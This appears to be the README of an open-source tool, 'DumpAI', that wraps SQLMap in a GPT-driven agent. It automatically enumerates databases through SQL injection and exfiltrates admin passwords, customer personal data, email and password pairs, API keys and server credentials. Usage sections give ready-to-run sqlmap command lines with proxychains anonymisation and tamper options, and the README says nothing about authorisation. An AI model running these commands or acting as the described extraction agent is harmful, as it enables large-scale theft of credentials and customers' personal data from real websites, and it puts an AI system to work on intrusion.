# DumpAI v2.2

**AI-Powered Autonomous SQLMap Data Extractor**

Intelligent extraction agent that uses AI to analyze database schemas, identify valuable data, and extract it efficiently using parallel SQLMap processes.

## Architecture

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                              DumpAI Agent System                                  │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                   │
│  ┌────────────────────┐   ┌────────────────────┐   ┌────────────────────────┐   │
│  │      Memory        │   │       Tools        │   │    AI Engine           │   │
│  │  ┌──────────────┐  │   │  ┌──────────────┐  │   │  ┌──────────────────┐  │   │
│  │  │ Action Log   │  │   │  │ EnumerateDBs │  │   │  │  GPT-4o-mini     │  │   │
│  │  │ Error Log    │  │   │  │ EnumTables   │  │   │  │                  │  │   │
│  │  │ Column Cache │  │   │  │ GetColumns   │  │   │  │  - Schema Anal.  │  │   │
│  │  │ Stats Track  │  │   │  │ SearchTables │  │   │  │  - Column Map    │  │   │
│  │  │ Session ID   │  │   │  │ SearchCols   │  │   │  │  - CMS Detect    │  │   │
│  │  └──────────────┘  │   │  │ DumpTable    │  │   │  │  - Categorize    │  │   │
│  │                    │   │  │ DumpColumns  │  │   │  └──────────────────┘  │   │
│  │  Persistence:      │   │  └──────────────┘  │   │                        │   │
│  │  session_*.json    │   │                    │   │  Fallback:             │   │
│  └────────────────────┘   │  Analyze Tools:    │   │  Pattern matching      │   │
│                           │  ┌──────────────┐  │   │  if AI unavailable     │   │
│                           │  │ AnalyzeSchema│  │   └────────────────────────┘   │
│                           │  │ AnalyzeCols  │  │                                 │
│                           │  └──────────────┘  │                                 │
│                           └────────────────────┘                                 │
│                                                                                   │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                   │
│                         ┌─────────────────────────┐                              │
│                         │     SQLMap Executor     │                              │
│                         │  ┌───────────────────┐  │                              │
│                         │  │ Parallel Workers  │  │                              │
│                         │  │  (ThreadPool)     │  │                              │
│                         │  │                   │  │                              │
│                         │  │ Worker 1 ──────┐  │  │                              │
│                         │  │ Worker 2 ────┐ │  │  │                              │
│                         │  │ Worker 3 ──┐ │ │  │  │                              │
│                         │  │ Worker 4 ┐ │ │ │  │  │                              │
│                         │  │ Worker 5 │ │ │ │  │  │                              │
│                         │  │          ▼ ▼ ▼ ▼  │  │                              │
│                         │  │    SQLMap Procs   │  │                              │
│                         │  └───────────────────┘  │                              │
│                         └─────────────────────────┘                              │
│                                                                                   │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                   │
│                              Agent Workflow                                       │
│  ┌─────────────────────────────────────────────────────────────────────────────┐ │
│  │                                                                             │ │
│  │   PHASE 1: Discovery          PHASE 2: Analysis        PHASE 3: Extraction │ │
│  │   ┌─────────────────┐         ┌─────────────────┐      ┌─────────────────┐ │ │
│  │   │                 │         │                 │      │                 │ │ │
│  │   │  Enumerate DBs  │────────▶│  AI Schema      │─────▶│  Parallel Dump  │ │ │
│  │   │       │         │         │  Analysis       │      │  (5 workers)    │ │ │
│  │   │       ▼         │         │       │         │      │       │         │ │ │
│  │   │  Enumerate      │         │       ▼         │      │       ▼         │ │ │
│  │   │  Tables         │         │  Identify       │      │  Parse Results  │ │ │
│  │   │       │         │         │  Targets        │      │       │         │ │ │
│  │   │       ▼         │         │       │         │      │       ▼         │ │ │
│  │   │  (or Smart      │         │       ▼         │      │  Categorize     │ │ │
│  │   │   Search)       │         │  AI Column      │      │  Data           │ │ │
│  │   │                 │         │  Analysis       │      │       │         │ │ │
│  │   └─────────────────┘         └─────────────────┘      │       ▼         │ │ │
│  │                                                        │  Save JSON      │ │ │
│  │                                                        └─────────────────┘ │ │
│  └─────────────────────────────────────────────────────────────────────────────┘ │
│                                                                                   │
└──────────────────────────────────────────────────────────────────────────────────┘
```

## Installation

```bash
git clone https://github.com/44pie/dumpai.git
cd dumpai
pip install openai tenacity
```

## Command Line Flags

### Required

| Flag | Description |
|------|-------------|
| `-c, --command` | SQLMap command to use as base (with -r, -p, proxychains, etc.) |

### Category Filters

| Flag | Description |
|------|-------------|
| `--user-data` | Extract admin/employee accounts, passwords, tokens, sessions |
| `--customer-data` | Extract customer PII (names, addresses, phones, emails) |
| `--email-pass` | Extract email + password/hash pairs only |
| `--api-key` | Extract API keys, secrets, OAuth tokens |
| `--sys-data` | Extract system credentials (DB creds, phpMyAdmin, FTP, SSH) |
| `--all` | Extract all categories |

### Performance & Parallelization

| Flag | Default | Description |
|------|---------|-------------|
| `-p, --parallel` | 5 | Max parallel table extractions |
| `-mr, --max-rows` | 0 | Max rows to dump per table (0 = unlimited) |
| `--no-parallel` | false | Disable parallel SQLMap processes |
| `--smart-search` | auto | Force Smart Search mode (auto-enabled for blind injections) |

### Output

| Flag | Default | Description |
|------|---------|-------------|
| `-o, --output` | dumpai_out | Output directory for results |
| `-v, --verbose` | false | Verbose output with debug info |

### Session

| Flag | Description |
|------|-------------|
| `--resume` | Resume from saved session file |

## Usage Examples

### Basic Usage

```bash
# Extract admin data and system credentials
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch" --user-data --sys-data

# Extract everything from database
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch -D mydb" --all

# Only email+password pairs
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch" --email-pass
```

### With Proxychains

```bash
python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id --batch" --all
```

### Performance Tuning

```bash
# Limit rows per table (faster for large DBs)
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch" --all -mr 100

# Increase parallel workers
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch" --all -p 10

# Disable parallelization (sequential mode)
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch" --all --no-parallel
```

### Advanced SQLMap Options

```bash
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch \
    --risk=3 --level=5 --threads=2 --time-sec=5 \
    --dbms=mysql --technique=TBEUSQ --tamper=randomcase" \
    --all -mr 50 -v -o out/
```

### Smart Search (for Blind Injections)

```bash
# Auto-enabled for time-based/boolean blind
python3 dumpai.py -c "python3 sqlmap.py -r req.txt -p id --batch" --all --smart-search
```

## Data Categories

| Category | Search Patterns | Column Patterns |
|----------|----------------|-----------------|
| `user_data` | employee, admin, user, staff, member, account | pass, pwd, hash, password, secret |
| `customer_data` | customer, client, address, order | email, mail, name, phone |
| `email_pass` | user, member, account, login | email + password pairs |
| `api_key` | api, key, token, oauth, credential | api_key, token, secret |
| `sys_data` | config, setting, option, connection | connection strings, server creds |

## Output Format

All data saved to single file: `{output_dir}/dump_all.json`

```json
{
  "meta": {
    "session_id": "20241213_120000",
    "timestamp": "2024-12-13T12:00:00",
    "database": "shop_db",
    "cms": "PrestaShop",
    "duration": 125.5,
    "tables_processed": 8,
    "rows_extracted": 1250
  },
  "data": {
    "user_data": [
      {
        "uname": "admin",
        "pass": "hashed_password",
        "email": "admin@site.com",
        "_source_table": "ps_employee",
        "_extracted_at": "2024-12-13T12:05:30"
      }
    ],
    "customer_data": [...],
    "email_pass": [...],
    "api_key": [...],
    "sys_data": [...]
  },
  "summary": {
    "tables_processed": 8,
    "rows_extracted": 1250,
    "ai_calls": 16,
    "commands_run": 45,
    "data_by_category": {
      "user_data": 25,
      "customer_data": 1200,
      "email_pass": 25,
      "api_key": 0,
      "sys_data": 0
    }
  }
}
```

## Features

### v2.2 New Features
- **Parallel SQLMap Execution**: Each column dumped by separate SQLMap process
- **Row Limiting**: `--max-rows` flag to limit extracted rows
- **Parallel Toggle**: `--no-parallel` to disable parallelization
- **Improved Parser**: Fixed table parsing for single-column dumps

### Core Features
- **AI-Powered Analysis**: GPT-4o-mini for intelligent schema/column analysis
- **CMS Detection**: Auto-detect PrestaShop, WordPress, Magento, WooCommerce
- **Smart Search Mode**: Pattern-based search optimized for blind injections
- **Memory System**: Full history, state tracking, session persistence
- **Category-Based Extraction**: Target specific data types
- **Fallback Mode**: Pattern matching when AI unavailable

## File Structure

```
dumpai/
├── dumpai.py          # CLI entry point
├── agent.py           # Main agent logic & workflow
├── memory.py          # State management & persistence
├── tools/
│   ├── __init__.py    # Tool exports
│   ├── base.py        # BaseTool class & SQLMap execution
│   ├── enumerate.py   # DB/table/column enumeration + search
│   ├── dump.py        # Data dumping (parallel & sequential)
│   └── analyze.py     # AI analysis tools
└── README.md
```

## Requirements

- Python 3.8+
- SQLMap installed
- OpenAI API key (`OPENAI_API_KEY` environment variable)

```bash
pip install openai tenacity
```

## License

MIT
